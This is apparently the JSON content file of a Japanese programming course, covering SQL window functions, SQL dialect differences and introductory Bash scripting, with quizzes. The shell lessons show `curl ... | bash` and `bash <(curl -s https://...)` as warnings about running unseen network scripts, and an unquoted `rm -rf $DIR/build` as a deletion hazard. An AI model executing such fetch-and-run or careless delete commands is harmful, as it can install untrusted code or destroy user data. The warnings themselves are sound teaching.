| 2400  | 6310          | 650\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `SUM(sales) OVER (ORDER BY d)` | 日付の順に、**その行までの合計**（累計）。`ORDER BY` があると「最初からこの行まで」が窓になる |\n| `LAG(sales) OVER (ORDER BY d)` | **1 つ前の行** の値。最初の行は前が無いので NULL |\n| `LEAD(sales) OVER (...)` | 1 つ後の行の値 |\n\n`sales - LAG(sales) OVER (ORDER BY d)` と書けば「前日比」です。Python で言うと、ループで前の値を覚えておきながら進むのと同じです。\n\n```python\ntotal, prev = 0, None\nfor row in daily:\n    total += row[\"sales\"]\n    print(row[\"d\"], row[\"sales\"], total, prev)\n    prev = row[\"sales\"]\n```\n\npandas なら `df[\"sales\"].cumsum()`（累計）、`df[\"sales\"].shift(1)`（前の行）、`df.groupby(\"category\")[\"price\"].rank()`（グループごとの順位）が対応します。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方 |\n|---|---|\n| `ROW_NUMBER() OVER (PARTITION BY x ORDER BY y DESC)` ＋ 外で `rn = 1` | x ごとに、y が最大の 1 行（最新の 1 件など） |\n| `SUM(...) OVER (ORDER BY 日付)` | 累計 |\n| `LAG(...)` / `LEAD(...)` | 前・次の行との比較（前月比など） |\n| `AVG(...) OVER (PARTITION BY ...)` | グループの平均を、行を残したまま付ける |\n| `ROWS BETWEEN 6 PRECEDING AND CURRENT ROW` | 窓の範囲を「前の 6 行から今の行まで」に（7 日間の移動平均など） |\n| `RANK()` で「上位 3 件」 | 同点があると 3 件より多く返ることがある。ちょうど 3 件なら `ROW_NUMBER()` |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "GROUP BY とウィンドウ関数（OVER）の違いとして正しいのは？",
        "choices": [
         "同じもので、書き方が違うだけ",
         "GROUP BY はグループを 1 行にまとめるが、ウィンドウ関数は行を残したまま集計の結果を付け足す",
         "ウィンドウ関数は集計関数を使えない"
        ],
        "answer": 1,
        "explain": "6 行の商品にカテゴリの平均を付けても、結果は 6 行のままです。"
       },
       {
        "question": "同じ値段の商品が 2 つ 2 位にいるとき、次の商品の順位が 4 になるのは？",
        "choices": [
         "RANK()",
         "DENSE_RANK()",
         "ROW_NUMBER()"
        ],
        "answer": 0,
        "explain": "RANK は同点の数だけ順位を飛ばします（2, 2, 4）。DENSE_RANK は飛ばさず（2, 2, 3）、ROW_NUMBER は必ず違う番号です。"
       },
       {
        "question": "`WHERE rn <= 3`（rn は ROW_NUMBER の別名）がエラーになった。直し方は？",
        "choices": [
         "ROW_NUMBER を RANK に変える",
         "WITH やサブクエリで包み、外側の SELECT の WHERE で rn を使う",
         "ORDER BY を消す"
        ],
        "answer": 1,
        "explain": "ウィンドウ関数は SELECT の段階で計算されるので、先に動く WHERE では使えません。一度包んでから外で絞ります。"
       }
      ]
     ],
     "id": "07-window-functions"
    },
    {
     "title": "データベースごとの違い ― SQLite・PostgreSQL・MySQL",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "database",
      "deploy",
      "strings"
     ],
     "summary": "同じ SQL を SQLite・PostgreSQL 17・MySQL 8.4 で実際に実行して比べた。割り算、文字列のつなぎ方、大文字小文字、文字数、GROUP BY、連番、RETURNING、NULL の並び順、日付の計算。手元の SQLite で動いた SQL が本番で動かない理由。",
     "body": "## このレッスンのゴール\n\n- SQL には「方言」があり、同じ SQL でもデータベースによって結果やエラーが違うことを説明できる\n- よく問題になる違い（割り算・文字列・大文字小文字・GROUP BY・連番）を知っている\n- 「手元の SQLite では動いたのに、本番の PostgreSQL でエラー」のときに疑う場所が分かる\n\n公開とクラウドのコースのレッスン 1 で、「開発は SQLite、本番は PostgreSQL」のように環境で違うことがある、と学びました。ここでは、実際に **SQLite・PostgreSQL 17・MySQL 8.4** の 3 つを用意して、同じ SQL を実行してみた結果を見ます。\n\n## 割り算\n\n```sql\nSELECT 7 / 2;\n```\n\n| SQLite | PostgreSQL | MySQL |\n|---|---|---|\n| `3` | `3` | `3.5000` |\n\nSQLite と PostgreSQL は、**整数どうしの割り算は整数**（小数点以下を切り捨て）になります。Python 2 の昔の `7 / 2` と同じで、今の Python の `7 // 2` に当たります。\n\n```sql\nSELECT 7 / 2.0;               -- 3.5（どちらかを小数にする）\nSELECT CAST(7 AS REAL) / 2;   -- 3.5（SQLite。PostgreSQL は 7::numeric / 2 など）\n```\n\n⚠️ 「平均の評価」「割合（何 %）」を計算する SQL で、`SUM(good) / COUNT(*)` が **いつも 0** になるのはこのためです。\n\n## 文字列をつなぐ\n\n```sql\nSELECT 'Ryo' || 'さん';\n```\n\n| SQLite | PostgreSQL | MySQL |\n|---|---|---|\n| `Ryoさん` | `Ryoさん` | `0` |\n\nMySQL では、`||` は **「または」（OR）** の意味になるので、文字列が数として扱われて `0` になりました。\n\n```sql\nSELECT CONCAT('Ryo', 'さん');   -- 3 つとも Ryoさん\n```\n\n## 大文字と小文字\n\n```sql\nSELECT 'Ryo' = 'ryo';\n```\n\n| SQLite | PostgreSQL | MySQL |\n|---|---|---|\n| `0`（違う） | `f`（違う） | `1`（**同じ**） |\n\nMySQL は、初期設定の照合順序（文字の比べ方のルール）で **大文字と小文字を区別しません**。逆に、`LIKE` は SQLite では英字の大文字小文字を区別せず（`'Ryo' LIKE 'ryo'` が真）、PostgreSQL では区別します（区別しないなら `ILIKE`）。\n\n⚠️ ログインのメールアドレスやユーザー名の重複チェックで、データベースを変えたら挙動が変わる、ということが起きます。保存するときに小文字にそろえておくのが確実です。\n\n## 文字数とバイト数\n\n```sql\nSELECT length('こんにちは'), char_length('こんにちは');\n```\n\n| SQLite | PostgreSQL | MySQL |\n|---|---|---|\n| `length` は `5`（`char_length` は無い） | `5` と `5` | `15` と `5` |\n\nMySQL の `length` は **バイト数**（UTF-8 の日本語は 1 文字 3 バイト。コンピュータの基礎コースの「文字コード」）を返します。文字数なら `char_length` です。\n\n（ちなみに、MySQL に接続するコマンドの文字コードの設定を UTF-8 にし忘れると、`char_length` まで 15 になりました。文字化けと同じで、接続の文字コードも大事です）\n\n## GROUP BY に無い列\n\nレッスン 3 で見たとおりです。\n\n```sql\nSELECT category, name, MAX(price) FROM products GROUP BY category;\n```\n\n| SQLite | PostgreSQL | MySQL |\n|---|---|---|\n| 動く（最大の行の name を出す） | **エラー** | **エラー**（`only_full_group_by`） |\n\n**SQLite だけが特別に許している** 書き方です。SQLite で作ったアプリを PostgreSQL に移すと、よくここでエラーになります。\n\n## 自動の連番\n\nレッスンのテーブルは `id INTEGER PRIMARY KEY` で作りました。これに id を書かずに INSERT すると…\n\n| SQLite | PostgreSQL | MySQL |\n|---|---|---|\n| 自動で連番が振られる | **エラー**：`null value in column \"id\" ... violates not-null constraint` | **エラー**：`Field 'id' doesn't have a default value` |\n\n`INTEGER PRIMARY KEY` が自動の連番になるのは **SQLite のルール** です。\n\n| データベース | 自動の連番の書き方 |\n|---|---|\n| SQLite | `id INTEGER PRIMARY KEY` |\n| PostgreSQL | `id INTEGER GENERATED ALWAYS AS IDENTITY PRIMARY KEY`（古い書き方は `SERIAL`） |\n| MySQL | `id INT AUTO_INCREMENT PRIMARY KEY` |\n\nPostgreSQL で `GENERATED ALWAYS AS IDENTITY` にして試すと、`RETURNING id` で `1` が返りました。\n\n## RETURNING と UPSERT\n\n| | SQLite | PostgreSQL | MySQL |\n|---|---|---|---|\n| `INSERT ... RETURNING id` | ✅ | ✅ | ❌ 文法エラー（`LAST_INSERT_ID()` を使う） |\n| 重複したら更新 | `ON CONFLICT ... DO UPDATE` | `ON CONFLICT ... DO UPDATE` | `ON DUPLICATE KEY UPDATE` |\n\n（レッスン 5。PostgreSQL の ON CONFLICT と、MySQL の ON DUPLICATE KEY UPDATE も実行して確かめました）\n\n## NULL の並び順\n\n```sql\nSELECT city FROM customers ORDER BY city;\n```\n\n| SQLite | PostgreSQL | MySQL |\n|---|---|---|\n| NULL が **先頭** | NULL が **最後** | NULL が **先頭** |\n\n決めたいときは `ORDER BY city NULLS FIRST` / `NULLS LAST`（SQLite・PostgreSQL）と書きます。\n\n## 日付の計算\n\n```sql\n-- 2026-11-23 の 7 日後\nSELECT date('2026-11-23', '+7 days');               -- SQLite\nSELECT DATE '2026-11-23' + 7;                       -- PostgreSQL\nSELECT DATE_ADD('2026-11-23', INTERVAL 7 DAY);      -- MySQL\n```\n\n3 つとも `2026-11-30` でした。日付の扱いは方言が特に多いところです。SQLite には日付の型が無く、文字列（`'2026-11-23'`）で持つのが普通です（データベース設計のコースのレッスン 1）。\n\n## 名前の囲み方\n\n| データベース | 列名・テーブル名を囲む記号 |\n|---|---|\n| SQLite・PostgreSQL | `\"order\"`（ダブルクォート） |\n| MySQL | `` `order` ``（バッククォート） |\n\n`order` や `user` のように **SQL の予約語と同じ名前** の列やテーブルを使うと、囲まないとエラーになります。名前は `orders`・`users` のように予約語を避けるのが楽です。\n\n## 方言とどう付き合うか\n\n| 方法 | |\n|---|---|\n| **開発と本番で同じデータベースを使う** | Docker（公開とクラウドのコースのレッスン 6）で手元にも PostgreSQL を立てる。いちばん確実 |\n| ORM を使う | 多くの違いを吸収してくれる（データベース設計のコースのレッスン 6）。ただし生の SQL の部分は自分で気をつける |\n| AI に頼むとき、データベースの名前とバージョンを伝える | 「PostgreSQL 17 で動く SQL にして」 |\n| テストを本番と同じデータベースで回す | CI（公開とクラウドのコースのレッスン 7）で PostgreSQL のコンテナを使う |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `SUM(x) / COUNT(*)` で割合 | ⚠️ SQLite・PostgreSQL では整数の割り算で 0 になりうる。`* 1.0` や `CAST` |\n| `'a' \\|\\| 'b'` を MySQL で | ⚠️ 0 になる。`CONCAT` |\n| `id INTEGER PRIMARY KEY` を PostgreSQL のマイグレーションに | ⚠️ 自動で連番にならない |\n| `SELECT a, b, MAX(c) ... GROUP BY a` | ⚠️ SQLite でしか動かない |\n| `WHERE email = ?` で重複チェック（MySQL） | 大文字小文字を区別しない。意図どおりか |\n| `SERIAL` / `AUTO_INCREMENT` / `AUTOINCREMENT` | それぞれ PostgreSQL / MySQL / SQLite の連番。どのデータベース向けか分かる |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "SQLite で `SELECT 7 / 2` を実行した結果は？",
        "choices": [
         "3",
         "3.5",
         "4"
        ],
        "answer": 0,
        "explain": "SQLite と PostgreSQL では、整数どうしの割り算は小数点以下が切り捨てられます。小数が欲しければ `7 / 2.0` のように片方を小数にします（MySQL は 3.5000 でした）。"
       },
       {
        "question": "手元の SQLite で動いた `SELECT category, name, MAX(price) FROM products GROUP BY category` が、本番の PostgreSQL でエラーになった。理由は？",
        "choices": [
         "PostgreSQL は MAX が使えないから",
         "GROUP BY に無い列（name）を SELECT に書くのを、SQLite だけが特別に許しているから",
         "本番のデータが空だから"
        ],
        "answer": 1,
        "explain": "PostgreSQL と MySQL では、SELECT に書けるのは GROUP BY の列か集計関数だけです。グループごとの最大の行はウィンドウ関数（レッスン 7）で取ります。"
       },
       {
        "question": "MySQL で `SELECT 'Ryo' || 'さん'` の結果は？",
        "choices": [
         "`Ryoさん`",
         "`0`",
         "エラー"
        ],
        "answer": 1,
        "explain": "MySQL では `||` は「または（OR）」の意味です。文字列をつなぐには `CONCAT('Ryo', 'さん')` を使います。"
       }
      ]
     ],
     "id": "08-dialects"
    }
   ],
   "status": "open"
  },
  {
   "title": "シェル（Bash）",
   "icon": "🐚",
   "order": 60,
   "description": "AI がよく出してくるシェルスクリプトを読めるようになる。スクリプトの形、変数と引用符、条件と終了コード、繰り返しと関数、パイプとテキスト処理、安全な書き方（set -euo pipefail・trap）、最後に実際のバックアップスクリプトを 1 行ずつ。すべて bash で実行して確かめたもの。",
   "levels": {
    "1": "入門：スクリプトの形",
    "2": "基礎：分岐・繰り返し・パイプ",
    "3": "実践：安全に読む・書く"
   },
   "id": "60-shell",
   "lessons": [
    {
     "title": "シェルスクリプトの第一歩 ― コマンドを並べたファイル",
     "level": 1,
     "minutes": 12,
     "concepts": [
      "tooling",
      "basics"
     ],
     "summary": "シェルスクリプトは、ターミナルで打つコマンドを上から順に並べたファイル。1 行目の #!（シバン）、実行の権限、`./` を付けて動かす理由、コメントと echo。",
     "body": "## このレッスンのゴール\n\n- シェルスクリプトが何で、Python のスクリプトとどこが似ているか説明できる\n- 1 行目の `#!/usr/bin/env bash` の意味が分かる\n- `Permission denied` が出たときに、何をすればよいか分かる\n\nターミナルと Git のコースで、コマンドを 1 つずつ打つ方法を学びました。このコースでは、**コマンドを並べたファイル（シェルスクリプト）** を読めるようになることを目指します。\n\n## シェルとシェルスクリプト\n\n**シェル** は、ターミナルに打った命令を読んで実行するプログラムです。いちばんよく使われるのが **Bash**（バッシュ）で、Linux の標準、Windows の Git Bash の中身もこれです（Mac の標準は zsh ですが、書き方はほとんど同じです）。\n\n**シェルスクリプト** は、そのコマンドを **上から順に並べたテキストファイル** です。拡張子は `.sh` にすることが多いです。\n\n```bash\n#!/usr/bin/env bash\n# あいさつするスクリプト\nname=\"Ryo\"\necho \"こんにちは、$name さん\"\necho \"今日は $(date +%Y-%m-%d) です\"\necho \"1 + 2 = $((1 + 2))\"\n```\n\n```text\nこんにちは、Ryo さん\n今日は 2026-11-23 です\n1 + 2 = 3\n```\n\n（このコースの出力は、すべて実際に bash 5.2 で実行したものです）\n\nPython で書くと、こうなります。\n\n```python\nfrom datetime import date\nname = \"Ryo\"\nprint(f\"こんにちは、{name} さん\")\nprint(f\"今日は {date.today()} です\")\nprint(f\"1 + 2 = {1 + 2}\")\n```\n\n| シェル | Python | 意味 |\n|---|---|---|\n| `name=\"Ryo\"` | `name = \"Ryo\"` | 変数に入れる（レッスン 2） |\n| `echo \"...$name...\"` | `print(f\"...{name}...\")` | 表示する |\n| `$(date +%Y-%m-%d)` | `date.today()` | **コマンドを実行して、その出力を文字として使う** |\n| `$((1 + 2))` | `1 + 2` | 計算 |\n| `# ...` | `# ...` | コメント |\n\nシェルは **「コマンドを動かすこと」が得意** で、計算や複雑なデータの処理は苦手です。ファイルのコピー・ツールの起動・インストール手順のような、**コマンドを順番に実行する作業** を自動化するのに使います。\n\n## 1 行目の `#!`（シバン）\n\n```bash\n#!/usr/bin/env bash\n```\n\n`#!` で始まる 1 行目を **シバン**（shebang）と呼びます。「このファイルは **bash で実行してね**」という指定です。\n\n| 書き方 | 意味 |\n|---|---|\n| `#!/usr/bin/env bash` | PATH から bash を探して使う（**おすすめ**。どこに bash が入っていても動く） |\n| `#!/bin/bash` | `/bin/bash` を使う（多くの Linux ではこれでも OK） |\n| `#!/bin/sh` | bash ではなく、もっと機能の少ない **sh** で動く。bash の書き方（`[[ ]]` など）が使えないことがある |\n| `#!/usr/bin/env python3` | Python のスクリプトにも同じ仕組みが使える |\n\n## 実行する\n\n```text\n$ ./hello.sh\nbash: ./hello.sh: Permission denied\n```\n\n作ったばかりのファイルには、**実行してよいという権限** が付いていません。`chmod +x` で付けます。\n\n```bash\nchmod +x hello.sh   # 実行の権限（x）を付ける\n./hello.sh          # 実行できるようになった\n```\n\n| 実行の仕方 | 意味 |\n|---|---|\n| `./hello.sh` | 権限を付けたファイルを直接実行。シバンのシェルで動く |\n| `bash hello.sh` | bash に「このファイルを読んで」と頼む。**権限が無くても動く** |\n| `hello.sh`（`./` 無し） | `command not found`。ターミナルは PATH の中しか探さない（ターミナルと Git のコースのレッスン 2）ので、「ここにあるファイル」と `./` で伝える |\n| `source hello.sh` / `. hello.sh` | **今のシェルの中で** 実行する。スクリプトで作った変数が、終わった後も残る（`.venv/bin/activate` などがこれ） |\n\n`ls -l` で `-rwxr-xr-x` のように `x` が見えたら、実行の権限が付いています。\n\n### Windows では\n\nGit Bash なら、`.sh` のファイルをそのまま `bash hello.sh` で動かせます。PowerShell は別のシェルなので、`.sh` は動きません（PowerShell 用のスクリプトは `.ps1`）。\n⚠️ Windows で作ったスクリプトを Linux で動かすと `$'\\r': command not found` が出ることがあります。改行コードが CRLF になっているためです（コンピュータの基礎コースのレッスン 3）。\n\n## AI のコードではこう出てくる\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail          # レッスン 6：失敗したら止まる、の設定\n\necho \"依存ライブラリをインストールします...\"\npip install -r requirements.txt\necho \"完了しました\"\n```\n\n| 見かけたら | 読み方 |\n|---|---|\n| `#!/usr/bin/env bash` | bash 用のスクリプト |\n| `#!/bin/sh` ＋ `[[ ... ]]` | ⚠️ sh では動かないことがある書き方。シバンを bash に |\n| `chmod +x scripts/*.sh` | scripts の中の .sh 全部に実行の権限を付ける |\n| `source .env` / `. ./venv/bin/activate` | 今のシェルに変数や設定を読み込む |\n| `bash <(curl -s https://...)` / `curl ... \\| bash` | ⚠️ ネットのスクリプトを中身を見ずに実行（ターミナルと Git のコースのレッスン 2） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`./deploy.sh` を実行したら `Permission denied` と出た。まずすることは？",
        "choices": [
         "パソコンを再起動する",
         "`chmod +x deploy.sh` で実行の権限を付ける（または `bash deploy.sh` で実行する）",
         "ファイルの拡張子を .py に変える"
        ],
        "answer": 1,
        "explain": "作ったばかりのファイルには実行の権限がありません。`chmod +x` で付けるか、bash に読ませて実行します。"
       },
       {
        "question": "スクリプトの 1 行目の `#!/usr/bin/env bash` の意味は？",
        "choices": [
         "コメントなので何の意味も無い",
         "このファイルを bash で実行する、という指定",
         "bash をインストールする命令"
        ],
        "answer": 1,
        "explain": "`#!` で始まる 1 行目（シバン）は、ファイルを直接実行したときに使うプログラムを指定します。"
       },
       {
        "question": "`echo \"今日は $(date +%Y-%m-%d) です\"` の `$(...)` は何をしている？",
        "choices": [
         "`$` という文字を表示している",
         "かっこの中のコマンドを実行し、その出力をその場所に入れている",
         "計算をしている"
        ],
        "answer": 1,
        "explain": "`$(コマンド)` はコマンドの出力を文字として使う書き方です。計算は `$((1 + 2))` のように、かっこが 2 重になります。"
       }
      ]
     ],
     "id": "01-first-script"
    },
    {
     "title": "変数と引用符 ― \"$var\" と書く理由",
     "level": 1,
     "minutes": 18,
     "concepts": [
      "variables",
      "strings",
      "tooling"
     ],
     "summary": "シェルの変数の作り方（= の前後にスペースを入れない）、ダブルクォートとシングルクォートの違い、引用符を付けないとスペースで分かれてしまう問題、export と環境変数、${...} の便利な書き方。",
     "body": "## このレッスンのゴール\n\n- シェルの変数を作る・使う書き方を読める（`=` の前後にスペースを入れない理由も）\n- `\"...\"` と `'...'` の違いが分かる\n- **変数を `\"$var\"` と引用符で囲む理由** を、実際の例で説明できる\n\n## 変数を作る・使う\n\n```bash\nname=\"Ryo\"          # 作る：= の前後にスペースを入れない\necho \"$name\"        # 使う：前に $ を付ける\n```\n\n⚠️ Python の癖で `name = \"Ryo\"` と書くと、こうなります。\n\n```text\nbash: name: command not found\n```\n\nシェルは **スペースで区切って** 読むので、`name = \"Ryo\"` は「`name` というコマンドに、`=` と `Ryo` を渡して実行」と解釈されます。**`=` の前後にスペースを入れない** のがシェルの決まりです。\n\n### 変数名の区切り\n\n```bash\nname=\"Ryo\"\necho \"${name}san\"     # Ryosan\necho \"[$namesan]\"     # []   ← namesan という別の（空の）変数だと思われた\n```\n\n変数のすぐ後ろに文字が続くときは、`${name}` と波かっこで囲みます。⚠️ 存在しない変数を使っても **エラーにならず、空になる** のがシェルの怖いところです（レッスン 6 で防ぎ方を学びます）。\n\n## ダブルクォートとシングルクォート\n\n```bash\nname=\"Ryo\"\necho \"こんにちは、$name さん\"     # こんにちは、Ryo さん\necho 'こんにちは、$name さん'     # こんにちは、$name さん\n```\n\n| 引用符 | 中の `$name`・`$(...)` | 使いどころ |\n|---|---|---|\n| `\"...\"`（ダブル） | **置き換えられる** | ふつうはこちら。変数を使う文字列 |\n| `'...'`（シングル） | **そのまま**（置き換えない） | `$` などをそのまま書きたいとき（正規表現、他のプログラムに渡すコード） |\n\nPython で言うと、`\"...\"` は f 文字列 `f\"...{name}...\"`、`'...'` は普通の文字列 `\"...{name}...\"` に近いです。\n\n## 引用符を付けないとどうなるか\n\nいちばん大事なところです。名前にスペースが入ったファイルで試します。\n\n```bash\nf=\"my file.txt\"\n\nls $f\n# ls: cannot access 'my': No such file or directory\n# ls: cannot access 'file.txt': No such file or directory\n\nls \"$f\"\n# my file.txt\n```\n\n引用符の無い `$f` は、**中のスペースで 2 つに分かれて**、`ls my file.txt`（`my` と `file.txt` の 2 つ）として実行されました。これを **単語分割** と呼びます。\n\nPython で言うと、こんな違いです。\n\n```python\nf = \"my file.txt\"\nls(*f.split())   # $f    → ls(\"my\", \"file.txt\")\nls(f)            # \"$f\"  → ls(\"my file.txt\")\n```\n\nファイル名だけでなく、ユーザーの入力・パス・コマンドの出力など、**スペースが入るかもしれないものは全部** 同じ問題が起きます。\n\n**変数は、いつも `\"$var\"` とダブルクォートで囲む**。これがシェルスクリプトを読むときの最大のチェックポイントです。\n\n| 書き方 | 判定 |\n|---|---|\n| `cp $src $dest` | ⚠️ スペースを含むパスで壊れる |\n| `cp \"$src\" \"$dest\"` | ✅ |\n| `rm -rf $DIR/build` | ⚠️⚠️ スペースで分かれて、別の場所を消す可能性（レッスン 6） |\n| `if [ $x = \"y\" ]` | ⚠️ x が空だと `[: =: unary operator expected` というエラー（レッスン 3） |\n\n## コマンドの出力と計算\n\n```bash\ntoday=\"$(date +%Y-%m-%d)\"       # コマンドの出力を変数に\ncount=\"$(wc -l < notes.txt)\"    # ファイルの行数を変数に\ntotal=$((3 + 4 * 2))            # 計算（整数だけ）→ 11\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `$(コマンド)` | コマンドを実行して、出力を文字として使う |\n| `` `コマンド` ``（バッククォート） | 同じ意味の古い書き方 |\n| `$((式))` | 整数の計算。小数は扱えない（`$((7 / 2))` は 3） |\n\n## シェルの変数と環境変数\n\n```bash\nx=5\nbash -c 'echo \"子のシェル: [$x]\"'      # 子のシェル: []\nexport x\nbash -c 'echo \"export の後: [$x]\"'     # export の後: [5]\n```\n\n| | シェルの変数 | 環境変数 |\n|---|---|---|\n| 作り方 | `x=5` | `export x=5` |\n| 見える範囲 | **そのシェルの中だけ** | そのシェルから **起動したプログラムにも** 渡される |\n| 例 | スクリプトの中の作業用の値 | `PATH`、`HOME`、`DATABASE_URL`（公開とクラウドのコースのレッスン 4） |\n\nPython のプログラムから `os.environ[\"DATABASE_URL\"]` で読めるのは、**export された環境変数だけ** です。`.env` を読み込むのに `export $(cat .env | xargs)` のような書き方を見かけるのはこのためです（スペースや `#` を含む値で壊れるので、`set -a; source .env; set +a` の方が安全です）。\n\n1 つのコマンドにだけ渡したいときは、前に書きます。\n\n```bash\nAPP_ENV=production python main.py    # この 1 回だけ APP_ENV を渡す\n```\n\n## ${...} の便利な書き方\n\n```bash\necho \"${undefined:-default}\"          # default   （空なら代わりの値）\n\nname=\"photo.final.jpg\"\necho \"${#name}\"                       # 15        （文字数）\necho \"${name%.*}\"                     # photo.final （最後の . から後ろを消す）\necho \"${name##*.}\"                    # jpg       （最後の . まで消す ＝ 拡張子）\necho \"${name/final/old}\"              # photo.old.jpg （置き換え）\n```\n\n| 書き方 | 意味 | Python で言うと |\n|---|---|---|\n| `${x:-値}` | x が空なら「値」 | `x or \"値\"` |\n| `${x:?メッセージ}` | x が空ならエラーで止める（レッスン 6） | `if not x: raise ...` |\n| `${#x}` | 文字数 | `len(x)` |\n| `${x%.*}` | 後ろから最短で `.〜` を消す | `x.rsplit(\".\", 1)[0]` |\n| `${x##*.}` | 前から最長で `〜.` を消す | `x.rsplit(\".\", 1)[-1]` |\n| `${x/古/新}` | 最初の 1 つを置き換え | `x.replace(\"古\", \"新\", 1)` |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `VAR = value` | ⚠️ スペースがあるとコマンドとして実行される |\n| `$var` が引用符なしで使われている | ⚠️ スペースを含む値で壊れる。`\"$var\"` に |\n| `'$HOME/app'` | シングルクォートなので `$HOME` が置き換わらない。意図どおりか |\n| `PORT=\"${PORT:-8000}\"` | 環境変数 PORT が無ければ 8000（よくある形） |\n| `export $(cat .env \\| xargs)` | 値にスペースや `#` があると壊れる |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "シェルで変数を作る正しい書き方は？",
        "choices": [
         "`name = \"Ryo\"`",
         "`name=\"Ryo\"`",
         "`$name = \"Ryo\"`"
        ],
        "answer": 1,
        "explain": "`=` の前後にスペースがあると、`name` というコマンドの実行だと解釈されます（`name: command not found`）。"
       },
       {
        "question": "`f=\"my file.txt\"` のとき、`ls $f` が 2 つのエラーを出した理由は？",
        "choices": [
         "引用符が無いので、値がスペースで分かれて「my」と「file.txt」の 2 つとして渡されたから",
         "ls はスペースを含むファイルを扱えないから",
         "変数 f が空だから"
        ],
        "answer": 0,
        "explain": "引用符の無い変数は単語分割されます。`ls \"$f\"` と書けば、1 つのファイル名として渡されます。"
       },
       {
        "question": "`echo '$HOME'` の出力は？",
        "choices": [
         "ホームディレクトリのパス（`/home/ryo` など）",
         "`$HOME` という文字そのまま",
         "何も表示されない"
        ],
        "answer": 1,
        "explain": "シングルクォートの中では変数が置き換えられません。置き換えたいならダブルクォート `\"$HOME\"` を使います。"
       }
      ]
     ],
     "id": "02-variables-quotes"
    },
    {
     "title": "条件分岐と終了コード ― 成功と失敗をどう判定するか",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "conditionals",
      "errors",
      "tooling"
     ],
     "summary": "シェルの if は「コマンドが成功したか」で分かれる。終了コード（$?）、[ ] と [[ ]] の条件、ファイルがあるかの確認、&& と ||、case。数字の比べ方が Python と違うところも。",
     "body": "## このレッスンのゴール\n\n- 終了コード（0 が成功）と `$?` の意味を説明できる\n- `if [ -f \"$file\" ]` などの条件を読める\n- `&&`・`||`・`case` を使った分岐を読める\n\n## 終了コード：コマンドの「結果の番号」\n\nどのコマンドも、終わるときに **終了コード**（0〜255 の数）を返します。\n\n| 終了コード | 意味 |\n|---|---|\n| **0** | **成功** |\n| 0 以外（1、2、127 …） | 失敗（番号の意味はコマンドごと。127 は「コマンドが見つからない」） |\n\n```bash\nls notes.txt > /dev/null\necho $?        # 0   ← 直前のコマンドの終了コード\n\nls nope 2> /dev/null\necho $?        # 2\n```\n\n`$?` は「直前のコマンドの終了コード」です。⚠️ Python の `True`（1）/`False`（0）と **逆** で、**0 が成功** なのに注意してください。\n\nPython のプログラムでは、`sys.exit(1)` で終了コードを返せます。例外で止まったときは 1 になります。CI（公開とクラウドのコースのレッスン 7）が ✅ / ❌ を判断しているのも、この終了コードです（`pytest` がテストの失敗で 0 以外を返す）。\n\n## if：コマンドが成功したら\n\n```bash\nif grep -q \"b\" notes.txt; then\n  echo \"見つかった\"\nelse\n  echo \"無い\"\nfi\n```\n\nシェルの `if` は、**後ろのコマンドを実行して、終了コードが 0 なら then の方** に進みます。`grep -q` は「見つかったら 0、見つからなければ 1」を返すだけのコマンドです。\n\n| 部分 | 意味 |\n|---|---|\n| `if コマンド; then` | コマンドが成功したら |\n| `elif コマンド; then` | Python の `elif` |\n| `else` | それ以外 |\n| `fi` | if の終わり（if を逆から書いたもの） |\n\nインデントは見やすさのためだけで、Python と違って意味はありません。\n\n## [ ]：条件を調べるコマンド\n\n```bash\nif [ -f \"$file\" ]; then\n```\n\n`[` は、実は **条件を調べて終了コードを返すコマンド** です（`test` という名前でもある）。だから `[` の後ろと `]` の前には **スペースが必要** です（`[-f \"$file\"]` はエラー）。\n\n### ファイルを調べる\n\n| 書き方 | 真になるとき |\n|---|---|\n| `[ -f \"$p\" ]` | ファイルがある |\n| `[ -d \"$p\" ]` | ディレクトリがある |\n| `[ -e \"$p\" ]` | 何かがある（ファイルでもディレクトリでも） |\n| `[ -x \"$p\" ]` | 実行できる |\n| `[ ! -f \"$p\" ]` | ファイルが **無い**（`!` は否定） |\n\n### 文字と数を比べる\n\n| 文字列 | 数 | 意味 |\n|---|---|---|\n| `[ \"$a\" = \"$b\" ]` | `[ \"$a\" -eq \"$b\" ]` | 等しい |\n| `[ \"$a\" != \"$b\" ]` | `[ \"$a\" -ne \"$b\" ]` | 等しくない |\n| `[ -z \"$a\" ]` | | 空 |\n| `[ -n \"$a\" ]` | | 空でない |\n| | `-lt` `-le` `-gt` `-ge` | `<` `<=` `>` `>=` |\n\n**数は `-gt` などの記号の英語**（greater than）で比べます。`<` `>` を使うと、**文字として** 比べることになります。\n\n```bash\n[ 3 -gt 10 ] && echo yes || echo no       # no（数として 3 > 10 は偽）\n[ \"10\" \\> \"9\" ] && echo \"10 > 9\" || echo \"10 < 9\"   # 10 < 9（文字として \"1\" < \"9\"）\n(( 10 > 9 )) && echo \"数: 10 > 9\"          # 数: 10 > 9（(( )) の中は数の比較）\n```\n\n### 引用符を忘れると\n\n```bash\nx=\"\"\n[ $x = \"y\" ]\n# bash: [: =: unary operator expected\n```\n\nx が空なので、`[ = \"y\" ]` として実行され、「`=` の左に何も無い」というエラーになりました。`[ \"$x\" = \"y\" ]` と書けば、`[ \"\" = \"y\" ]` になって正しく偽（終了コード 1）になります。**レッスン 2 の「変数は引用符で囲む」は、ここでも大事** です。\n\n### [[ ]]：bash の便利版\n\n```bash\n[[ \"abc\" == a* ]] && echo match     # match（パターンで比べられる）\n```\n\n`[[ ... ]]` は bash の書き方で、`&&`・`||` をそのまま中に書けたり、パターン（`a*`）や正規表現（`=~`）で比べられたりします。引用符の付け忘れにも強いです。ただし `#!/bin/sh` では使えないことがあります（レッスン 1）。\n\n## 実際のスクリプト\n\n```bash\n#!/usr/bin/env bash\nfile=\"$1\"                                   # 1 つ目の引数（レッスン 4）\nif [ -z 